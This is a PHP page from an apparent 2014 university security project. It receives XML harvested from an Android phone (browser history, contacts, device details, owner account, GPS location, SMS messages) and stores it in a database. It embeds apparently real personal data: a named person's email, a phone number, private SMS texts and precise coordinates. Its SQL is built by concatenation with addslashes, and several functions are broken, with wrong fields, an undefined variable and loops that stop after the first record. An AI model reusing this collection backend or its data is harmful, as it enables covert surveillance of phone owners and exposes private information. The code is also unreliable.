<!DOCTYPE html>
<html>
    <head>
        <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
        <title>Projet de sécurité - UQAC 2014</title>
    </head>
    <body>
<?php
		
		$ALLXMLSTR= "<ALL>
				  <ALLHISTORY>
					  <browserPage><title>Université UQAC</title><url>http://www.uqac.ca/?nimp</url></browserPage>
					  <browserPage><title>Université UQAC 222 éé 2</title><url>http://www.uqac.ca/?nimpééééééééé</url></browserPage>
				  </ALLHISTORY>
				  <ALLCONTACTS>
					<contact>
						<id>9</id>
						<email>truc@truc.fr</email>
						<DisplayName>Caisse d'épargne</DisplayName>
						<phone><number>03-83-47-79-80</number><timeContact>5</timeContact></phone>
						<phone><number>03-83-47-79-8888</number><timeContact>2</timeContact></phone>
						<organization></organization>
					</contact>
				  </ALLCONTACTS>
				  <deviceInformations>
					  <model>IGGY</model>
					  <hardware>mt6572</hardware>
					  <manufacturer>Enspert</manufacturer>
					  <product>wiko</product>
					  <user>android</user>
				  </deviceInformations>
				  <ALLACCOUNTS>
					  <OwnerAccount>
						<name>50-5 Price Est Sylvain Stoesel</name>
						<email>sylvain.stoesel@telecomnancy.net</email>
					  </OwnerAccount>
				  </ALLACCOUNTS>
				  <localisation>
					<lat>48.4286735</lat>
					<lon>-71.0546926</lon>
				   </localisation>
				  <ALLSMS>
					<sms>
						<contactNumber>+33695168256</contactNumber>
						<convID>3</convID>
						<message>On arrive dans 20 minutes environ. On a plein de photos</message>
					</sms>
					<sms>
						<contactNumber>+33695168256</contactNumber>
						<convID>3</convID>
						<message>Skipe ne repond pas je vais au lit comment allez vs?</message>
					</sms>
				  </ALLSMS>
				  </ALL>";
		
		
		include("db_connect.php");
		
		//if (isset($_POST["xml"])){
		//	$strxml = $_POST["xml"];
		
			$ALLXMLSTR = str_replace("&", "&amp;", $ALLXMLSTR);
			
			$ALLXML = new DOMDocument;
			$ALLXML->loadXML($ALLXMLSTR);
			if (!$ALLXML) {
				print 'Document XML non valide';
				exit;
			}
			
			$USERID = creerUtilisateur($ALLXML->getElementsByTagName('ALLACCOUNTS')->item(0), $bdd);
			
			if ($USERID>0){
				creerLocalisation($ALLXML->getElementsByTagName('localisation')->item(0), $USERID, $bdd);
				creerTelephone($ALLXML->getElementsByTagName('deviceInformations')->item(0), $USERID, $bdd);
				creerHistorique($ALLXML->getElementsByTagName('ALLHISTORY')->item(0), $USERID, $bdd);
				creerContacts($ALLXML->getElementsByTagName('ALLCONTACTS')->item(0), $USERID, $bdd);
				creerSMS($ALLXML->getElementsByTagName('ALLSMS')->item(0), $USERID, $bdd);
			}
			else
				print "Utilisateur non créé";
		//}
		
		
		
		
		
		
		
		
		/*******************************************************************************************************
		*
		*   CREATION SMS
		*
		*******************************************************************************************************/
		function creerSMS($XML, $USERID, $bdd){
			foreach($XML->getElementsByTagName('sms') as $sms){
				$titre = addslashes($sms->getElementsByTagName('title')->item(0)->nodeValue);
				$DisplayName = addslashes($sms->getElementsByTagName('DisplayName')->item(0)->nodeValue);
				
				$requete = "insert into SMS(ID_UTILISATEUR, TITRE, URL) values ($USERID, '$titre', '$url')";
				$sql = $bdd->exec($requete);
				
				return $sql;
			}
		}
		
		
		
		
		
		
		/*******************************************************************************************************
		*
		*   CREATION CONTACTS
		*
		*******************************************************************************************************/
		function creerContacts($XML, $USERID, $bdd){
			foreach($XML->getElementsByTagName('contact') as $contact){
				$id = $contact->getElementsByTagName('id')->item(0)->nodeValue;
				$name = addslashes($contact->getElementsByTagName('DisplayName')->item(0)->nodeValue);
				$adresse = ""; //XML!!!!!
				
				if ($contact->getElementsByTagName('email')->length>0)
					$email1 = addslashes($contact->getElementsByTagName('email')->item(0)->nodeValue);
				else $email1 = "";
				
				if ($contact->getElementsByTagName('email')->length>1)
					$email2 = addslashes($contact->getElementsByTagName('email')->item(1)->nodeValue);
				else $email2 = "";
				
				$timeContact = 0;
				$phone1 = "";
				$phone2 = "";
				
				if ($contact->getElementsByTagName('phone')->length>0){
					$phone1 = addslashes($contact->getElementsByTagName('phone')->item(0)->getElementsByTagName('number')->item(0)->nodeValue);
					$timeContact += $contact->getElementsByTagName('phone')->item(0)->getElementsByTagName('timeContact')->item(0)->nodeValue;
				}
				
				if ($contact->getElementsByTagName('phone')->length>1){
					$phone2 = addslashes($contact->getElementsByTagName('phone')->item(1)->getElementsByTagName('number')->item(0)->nodeValue);
					$timeContact += $contact->getElementsByTagName('phone')->item(1)->getElementsByTagName('timeContact')->item(0)->nodeValue;
				}
				
				if ($contact->getElementsByTagName('organization')->length>0){
					$organizationName = addslashes($contact->getElementsByTagName('organization')->item(0)->getElementsByTagName('organizationName')->item(0)->nodeValue);
					$title = addslashes($contact->getElementsByTagName('organization')->item(0)->getElementsByTagName('title')->item(0)->nodeValue);
				}
				else{
					$organizationName = "";
					$title = "";
				}
				
				
				$requete = "insert into CONTACT(ID_UTILISATEUR, IDCONTACTANDROID, NOM, NUMEROTEL1, NUMEROTEL2, EMAIL1, EMAIL2, ADRESSE, NOMORGANISATION, TITREORGANISATION, NBCONTACTSTEL, NBCONTACTSSMS)".
									  " values ($USERID, $id, '$name', '$phone1','$phone2', '$email1', '$email2', '$adresse', '$organizationName', '$title', $timeContact, NULL)";
				$sql = $bdd->exec($requete);
				
				return $sql;
			}
		}
		
		
		
		
		/*******************************************************************************************************
		*
		*   CREATION HISTORIQUE
		*
		*******************************************************************************************************/
		function creerHistorique($XML, $USERID, $bdd){
			foreach($XML->getElementsByTagName('browserPage') as $historic){
				$titre = addslashes($historic->getElementsByTagName('title')->item(0)->nodeValue);
				$DisplayName = addslashes($historic->getElementsByTagName('DisplayName')->item(0)->nodeValue);
				
				$requete = "insert into HISTORIQUE(ID_UTILISATEUR, TITRE, URL) values ($USERID, '$titre', '$url')";
				$sql = $bdd->exec($requete);
				
				return $sql;
			}
		}
		
		
		/*******************************************************************************************************
		*
		*   CREATION TELEPHONE
		*
		*******************************************************************************************************/
		function creerTelephone($XML, $USERID, $bdd){
			$numtel = ""; // XML!!!!!!!!!
			$imei = ""; // XML!!!!!!!!!
			$model = addslashes($XML->getElementsByTagName('model')->item(0)->nodeValue);
			$hardware = addslashes($XML->getElementsByTagName('hardware')->item(0)->nodeValue);
			$manufacturer = addslashes($XML->getElementsByTagName('manufacturer')->item(0)->nodeValue);
			$product = addslashes($XML->getElementsByTagName('product')->item(0)->nodeValue);
			$user = addslashes($XML->getElementsByTagName('user')->item(0)->nodeValue);
			
			$requete = "insert into TELEPHONE(ID_UTILISATEUR, NUMEROTEL, MODELE, VERSION, IMEI) values ($USERID, '$numtel', '$product $model', '$user $manufacturer $hardware', '$imei')";
			$sql = $bdd->exec($requete);
			
			return $sql;
		}
		
		
		/*******************************************************************************************************
		*
		*   CREATION LOCALISATION
		*
		*******************************************************************************************************/
		function creerLocalisation($XML, $USERID, $bdd){
			$lat = addslashes($XML->getElementsByTagName('lat')->item(0)->nodeValue);
			$lon = addslashes($XML->getElementsByTagName('lon')->item(0)->nodeValue);
			
			$requete = "insert into LOCALISATION(ID_UTILISATEUR, COORDONNEES) values ($USERID, '$lat,$lon')";
			$sql = $bdd->exec($requete);
			
			return $sql;
		}
		
		
		/*******************************************************************************************************
		*
		*   CREATION UTILISATEUR
		*
		*******************************************************************************************************/
		function creerUtilisateur($XML, $bdd){
			$nom1 = addslashes($XML->getElementsByTagName('OwnerAccount')->item(0)->getElementsByTagName('name')->item(0)->nodeValue);
			$adresse1 = "";
			$gmail1 = addslashes($XML->getElementsByTagName('OwnerAccount')->item(0)->getElementsByTagName('email')->item(0)->nodeValue);
			
			if ($XML->getElementsByTagName('OwnerAccount')->length>1){
				$nom2 = addslashes($XML->getElementsByTagName('OwnerAccount')->item(1)->getElementsByTagName('name')->item(0)->nodeValue);
				$adresse2 = "";
				$gmail2 = addslashes($XML->getElementsByTagName('OwnerAccount')->item(1)->getElementsByTagName('email')->item(0)->nodeValue);
			}
			else{
				$nom2 = "";
				$adresse2 = "";
				$gmail2 = "";
			}
			
			$randomString = substr(str_shuffle("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ"), 0, 32);
			
			$requete = "insert into UTILISATEUR(NOM1, NOM2, ADRESSE1, ADRESSE2, COMPTEMAIL1, COMPTEMAIL2, DATEENREGISTREMENTBDD, CHAINEUNIQUE) values ('$nom1', '$nom2', '$adresse1', '$adresse2', '$gmail1', '$gmail2', now(), '$randomString')";
			$sql = $bdd->exec($requete);
			
			if ($sql>0){
				print "#$randomString#";
				return $bdd->lastInsertId(); 
			}
			return -1;
		}
?>
	</body>
</html>